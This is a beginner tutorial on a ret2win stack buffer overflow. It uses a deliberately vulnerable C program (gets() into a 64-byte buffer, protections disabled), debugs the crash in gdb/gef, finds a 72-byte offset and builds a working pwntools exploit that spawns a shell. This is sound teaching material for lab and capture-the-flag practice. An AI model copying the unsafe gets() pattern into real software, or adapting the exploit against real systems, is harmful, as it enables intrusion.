# Exploitation

The program which we will be exploiting:

{% file src="../../../../.gitbook/assets/buffer-overflow.zip" caption="buffer-overflow.zip" %}

Which the source code is the following:

```c
#include <stdio.h>
#include <stdlib.h>

void win() {
    system("/bin/sh");
}

int main() {
    char buf[64];
    puts("What are you going to say?");
    gets(buf);
    puts("Thank you, have a nice day!");
    return 0;
}
```

And compiling:

```c
$ gcc -fno-stack-protector -no-pie -z execstack -o vuln vuln.c -Wall
```

When we perform binary exploitation, we have our main aim: 1. Remote Code Execution \(RCE\)

* We can execute any code we want on the target machine

In CTFs, this is shown either by

* Gaining a bash shell
* Reading a `flag.txt` file

One way which we can gain RCE \(for Linux\) is by executing the command `system("/bin/sh")` which will execute the system command with parameters `/bin/sh`, which will start a shell for us!

As you can see, we have the `system("/bn/sh")` call in the file already, great! So our aim is to get that to execute.

### Analysis <a id="analysis"></a>

So we've already got the source, so let's analyse it. We could use a tool called `Ghidra` or `Ida`, but I don't want to scare you just yet :\)

So in our `main` function, we have a variable named `buf` which can hold 64 characters. A message is then printed, and then our input is entered and stored into `buf` with the `gets` call. Another message is sent, and then the program returns `0` and exits.

Now, when you compile, you're going to get a warning

```c
vuln.c: In function ‘main’:
vuln.c:11:2: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
    11 |  gets(buf);
       |  ^~~~      |  fgets
 /usr/bin/ld: /tmp/cc00OxSA.o: in function `main':
 vuln.c:(.text+0x34): warning: the `gets' function is dangerous and should not be used.
```

What's wrong with `gets`? Let's take a look at the man page  


![](../../../../.gitbook/assets/2021-06-01_scrot%20%282%29.png)

And checking the BUGS

![](../../../../.gitbook/assets/2021-06-01_scrot%20%283%29.png)

So we see that the `gets`function will get all input up until it receives a newline or EOF \(null byte - `0x00`\). So what if we didn't provide a null byte, and went past the 64 byte limit that `buf` has?

```c
$ ./bof
What are you going to say?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thank you, have a nice day!
[1]    59959 segmentation fault (core dumped)  ./bof
```

We get a seg fault. How come? Let's use gdb, the GNU debugger, to debug our program and investigate. I'm using an extension called `gef` which aids in debugging and exploiting \([https://gef.readthedocs.io/en/master/](https://gef.readthedocs.io/en/master/)\)

```c
$ gdb -q bof 
GEF for linux ready, type `gef' to start, `gef config' to configure
91 commands loaded for GDB 10.1 using Python engine 3.9
Reading symbols from bof...
(No debugging symbols found in bof)
gef➤  r
Starting program: ./bof 
What are you going to say?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
Thank you, have a nice day!

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401190 in main ()
...
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x00007ffff7ec5f67  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007fffffffe058  →  "AAAAAAAAAAAAAAAAAAAAA"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00000000004052a0  →  "Thank you, have a nice day!\n"
$rdi   : 0x00007ffff7f9a4f0  →  0x0000000000000000
$rip   : 0x0000000000401190  →  <main+55> ret 
$r8    : 0x1c              
$r9    : 0x0               
$r10   : 0x40              
$r11   : 0x246             
$r12   : 0x0000000000401060  →  <_start+0> endbr64 
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
────────────────────────────────────────────── stack ────
0x00007fffffffe058│+0x0000: "AAAAAAAAAAAAAAAAAAAAA"	 ← $rsp
0x00007fffffffe060│+0x0008: "AAAAAAAAAAAAA"
0x00007fffffffe068│+0x0010: 0x0000004141414141 ("AAAAA"?)
0x00007fffffffe070│+0x0018: 0x0000000000401159  →  <main+0> push rbp
0x00007fffffffe078│+0x0020: 0x0000004000000000
0x00007fffffffe080│+0x0028: 0x0000000000000000
0x00007fffffffe088│+0x0030: 0xe3d9b18320b632db
0x00007fffffffe090│+0x0038: 0x0000000000401060  →  <_start+0> endbr64 
─────────────────────────────────── code:x86:64 ────
     0x401181 <main+40>        movabs ds:0xfffffea6e800000e, al
     0x40118a <main+49>        mov    eax, 0x0
     0x40118f <main+54>        leave  
 →   0x401190 <main+55>        ret    
[!] Cannot disassemble from $PC
────────────────────────────── threads ────
[#0] Id 1, Name: "bof", stopped 0x401190 in main (), reason: SIGSEGV
──────────────────────────────────────────────────── trace ────
[#0] 0x401190 → main()
──────────────────────────────────
gef➤  

```

So that's a lotttttt of output. What does it all mean?

At the top, we see what we saw before. But now the program has crashed, and gef has given us a dump of some critical things we need to view.

First up, the registers: 

```c
──────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x00007ffff7ec5f67  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007fffffffe058  →  "AAAAAAAAAAAAAAAAAAAAA"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00000000004052a0  →  "Thank you, have a nice day!\n"
$rdi   : 0x00007ffff7f9a4f0  →  0x0000000000000000
$rip   : 0x0000000000401190  →  <main+55> ret 
$r8    : 0x1c              
$r9    : 0x0               
$r10   : 0x40              
$r11   : 0x246             
$r12   : 0x0000000000401060  →  <_start+0> endbr64 
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 

```

You can view what each register does by visiting the registers page.

So what can we notice? We see that we've overflowed the `rbp` registers, `rsp` register points to our input, and rip points to `main+55` address, which is a `ret` assembly instruction. That just means it's going to go to wherever it last was. The other address we don't really need to know.

Now onto the stack portion

```c
──────────────────────────────────────────────────────── stack ────
0x00007fffffffe058│+0x0000: "AAAAAAAAAAAAAAAAAAAAA"	 ← $rsp
0x00007fffffffe060│+0x0008: "AAAAAAAAAAAAA"
0x00007fffffffe068│+0x0010: 0x0000004141414141 ("AAAAA"?)
0x00007fffffffe070│+0x0018: 0x0000000000401159  →  <main+0> push rbp
0x00007fffffffe078│+0x0020: 0x0000004000000000
0x00007fffffffe080│+0x0028: 0x0000000000000000
0x00007fffffffe088│+0x0030: 0xe3d9b18320b632db
0x00007fffffffe090│+0x0038: 0x0000000000401060  →  <_start+0> endbr64 

```

So this is showcasing what's on the stack at that point. If you don't know about the stack, go take a look at  [https://en.wikipedia.org/wiki/Stack\_\(abstract\_data\_type\)](https://en.wikipedia.org/wiki/Stack_%28abstract_data_type%29). Essentially it holds values which the program `push`es onto to save addresses and values, and `pop`s from to get values and addresses.

Onto the code portion

```c
───────────────────────────────────────────── code:x86:64 ────
     0x401181 <main+40>        movabs ds:0xfffffea6e800000e, al
     0x40118a <main+49>        mov    eax, 0x0
     0x40118f <main+54>        leave  
 →   0x401190 <main+55>        ret    
[!] Cannot disassemble from $PC

```

This bit is getting into some assembly. It's showing what the instruction was before it ran into any issues, and then an arrow showing where we are currently. The error is saying that it can't get the instruction which is at the register `PC` or the program counter. That's because we filled it with `A`'s!

Now the threads and trace

```c
─────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "bof", stopped 0x401190 in main (), reason: SIGSEGV
───────────────────────────────────────────────── trace ────
[#0] 0x401190 → main()

```

So this is essentially showing us the reason that it's stopped, and a trace of how the program got to this stage, in terms of function calls.

Now back onto the debugging. Recalling the different registers, the `rip` holds the instruction that is going to be executed next. So we really want to point it to the `win` function, which holds `system("/bin/sh")`. So, therefore, we need control of `rip`. As the program crashed, the `ret` instruction doesn't know where to return to. Where is it thinking of going to?

```c
gef➤  info frame
Stack level 0, frame at 0x7fffffffe058:
 rip = 0x401190 in main; saved rip = 0x4141414141414141
 Arglist at 0x4141414141414141, args: 
 Locals at 0x4141414141414141, Previous frame's sp is 0x7fffffffe060
 Saved registers:
  rip at 0x7fffffffe058
```

So it should jump to the saved rip. But it's corrupted with `0x41`, or `A` in hex. So how do we get the specific _offset_ to the saved rip?

gef has a nice handy feature called `pattern`. This can generate a De Bruijn pattern, which is simply a pattern which doesn't repeat. It contains

* aaaa
* aaab
* aaac
* aaad
* aaae
* .....

Up to the value you set. Say we wanted 100

```c
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[+] Saved as '$_gef0'
```

As we're dealing with a 64 bit machine, gef generates the pattern in chunks of 8, or in 8 byte sections. Now let's send the pattern in and see where the saved rip is

```c
gef➤  r
Starting program: ./bof 
What are you going to say?
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaa...
Thank you, have a nice day!

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401190 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x00007ffff7ec5f67  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007fffffffe058  →  "jaaaaaaakaaaaaaalaaaaaaamaaa"
$rbp   : 0x6161616161616169 ("iaaaaaaa"?)
$rsi   : 0x00000000004052a0  →  "Thank you, have a nice day!\n"
$rdi   : 0x00007ffff7f9a4f0  →  0x0000000000000000
$rip   : 0x0000000000401190  →  <main+55> ret 
$r8    : 0x1c              
$r9    : 0x0               
$r10   : 0x40              
$r11   : 0x246             
$r12   : 0x0000000000401060  →  <_start+0> endbr64 
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────── stack ────
0x00007fffffffe058│+0x0000: "jaaaaaaakaaaaaaalaaaaaaamaaa"	 ← $rsp
0x00007fffffffe060│+0x0008: "kaaaaaaalaaaaaaamaaa"
0x00007fffffffe068│+0x0010: "laaaaaaamaaa"
0x00007fffffffe070│+0x0018: 0x000000006161616d ("maaa"?)
0x00007fffffffe078│+0x0020: 0x0000004000000000
0x00007fffffffe080│+0x0028: 0x0000000000000000
0x00007fffffffe088│+0x0030: 0x99e771995dbb2050
0x00007fffffffe090│+0x0038: 0x0000000000401060  →  <_start+0> endbr64 
───────────────────────────────────────────── code:x86:64 ────
     0x401181 <main+40>        movabs ds:0xfffffea6e800000e, al
     0x40118a <main+49>        mov    eax, 0x0
     0x40118f <main+54>        leave  
 →   0x401190 <main+55>        ret    
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "bof", stopped 0x401190 in main (), reason: SIGSEGV
───────────────────────────────────────────────── trace ────
[#0] 0x401190 → main()
───────────────────────────────────────
gef➤  info frame
Stack level 0, frame at 0x7fffffffe058:
 rip = 0x401190 in main; saved rip = 0x616161616161616a
 Arglist at 0x6161616161616169, args: 
 Locals at 0x6161616161616169, Previous frame's sp is 0x7fffffffe060
 Saved registers:
  rip at 0x7fffffffe058
gef➤  pattern search 0x616161616161616a
[+] Searching '0x616161616161616a'
[+] Found at offset 72 (little-endian search) likely
[+] Found at offset 65 (big-endian search) 
```

So we see that it's at an offset of `72`. Why 72, you may ask? If you look at the source code, you can see that we're saving a size of 64 for the `buf` variable. After that, the address that the `rbp` register holds, and then the address for the `rip` is stored.

```c
gef➤  p/x $rbp
$3 = 0x6161616161616169
gef➤  pattern search $rbp
[+] Searching '$rbp'
[+] Found at offset 64 (little-endian search) likely
[+] Found at offset 57 (big-endian search) 
```

As this binary is little endian, that's the value we go with, for the offset. Ie. we can control the `rip` register with an offset of 72 bytes.

Let's check that

```c
gef➤  r
Starting program: ./bof 
What are you going to say?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
Thank you, have a nice day!

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401190 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x00007ffff7ec5f67  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007fffffffe058  →  "BBBBBBBB"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00000000004052a0  →  "Thank you, have a nice day!\n"
$rdi   : 0x00007ffff7f9a4f0  →  0x0000000000000000
$rip   : 0x0000000000401190  →  <main+55> ret 
$r8    : 0x1c              
$r9    : 0x0               
$r10   : 0x40              
$r11   : 0x246             
$r12   : 0x0000000000401060  →  <_start+0> endbr64 
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────── stack ────
0x00007fffffffe058│+0x0000: "BBBBBBBB"	 ← $rsp
0x00007fffffffe060│+0x0008: 0x00007fffffffe100  →  0x0000000000000000
0x00007fffffffe068│+0x0010: 0x00000001f7dfcfcb
0x00007fffffffe070│+0x0018: 0x0000000000401159  →  <main+0> push rbp
0x00007fffffffe078│+0x0020: 0x0000004000000000
0x00007fffffffe080│+0x0028: 0x0000000000000000
0x00007fffffffe088│+0x0030: 0x5221ceac2ba69d74
0x00007fffffffe090│+0x0038: 0x0000000000401060  →  <_start+0> endbr64 
───────────────────────────────── code:x86:64 ────
     0x401181 <main+40>        movabs ds:0xfffffea6e800000e, al
     0x40118a <main+49>        mov    eax, 0x0
     0x40118f <main+54>        leave  
 →   0x401190 <main+55>        ret    
[!] Cannot disassemble from $PC
───────────────────────────────────── threads ────
[#0] Id 1, Name: "bof", stopped 0x401190 in main (), reason: SIGSEGV
───────────────────────────────── trace ────
[#0] 0x401190 → main()
─────────────────────────────────────────────────────
gef➤  info frame
Stack level 0, frame at 0x7fffffffe058:
 rip = 0x401190 in main; saved rip = 0x4242424242424242
 Arglist at 0x4141414141414141, args: 
 Locals at 0x4141414141414141, Previous frame's sp is 0x7fffffffe060
 Saved registers:
  rip at 0x7fffffffe058
gef➤ 
```

So we see that it is correct, great! Just so that we don't lose this, I'm going to move to script this. It's just easier to manage.

```python
from pwn import *

e = context.binary = ELF("./bof")
p = process(e.path)
libc = e.libc

payload = b"A"*72
payload += p64(0xdeadbeef)

p.sendline(payload)
p.interactive()
```

And so when we run that

```python
$ python exploit-x86_64.py
[*] './bof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Starting local process './bof': pid 62197
[*] Switching to interactive mode
What are you going to say?
Thank you, have a nice day!
[*] Got EOF while reading in interactive
$ ls
[*] Process './bof' stopped with exit code -11 (SIGSEGV) (pid 62197)
[*] Got EOF while sending in interactive
```

Now, we need to figure out where we are going to return to. We can input this manually, or get pwntools to help us

Let's do it manually

We know we want to return to the win function \(hence this exploit is aptly named `ret2win`\), so let's print the address for it

```python
gef➤  p win
$2 = {<text variable, no debug info>} 0x401146 <win>
```

And so when we replace `0xdeadbeef` with that address, it should execute that function.

```python
$ python exploit-x86_64.py
[*] './bof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Starting local process './bof': pid 62352
[*] Switching to interactive mode
What are you going to say?
Thank you, have a nice day!
$ id
uid=1000(tango) gid=1000(tango) groups=1000(tango),0(root),108(vboxusers),969(tablet)
$ echo pwned
pwned

```

Bamn!! We've done it! But now, let's edit our exploit a tiny bit to use pwntools

```python
from pwn import *

e = context.binary = ELF("./bof")
p = process(e.path)

payload = b"A"*72
payload += p64(e.symbols["win"])

p.sendline(payload)
p.interactive()
```

And run it

```python
$ python exploit-x86_64.py
[*] './bof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Starting local process '.bof': pid 62471
[*] Switching to interactive mode
What are you going to say?
Thank you, have a nice day!
$ id
uid=1000(tango) gid=1000(tango) groups=1000(tango),0(root),108(vboxusers),969(tablet)

```

So what happened there? In our exploit, we define the variable `e` as our ELF file. We can then pick out specific symbols, or functions, as well as addresses from the GOT and PLT. It nicely cleans up our script for when we review it. 

And that's your first exploit! Well done!

Final exploit code:

```python
from pwn import *

e = context.binary = ELF("./bof")
p = process(e.path)
libc = e.libc

payload = b"A"*72
payload += p64(e.symbols["win"])

p.sendline(payload)
p.interactive()
```

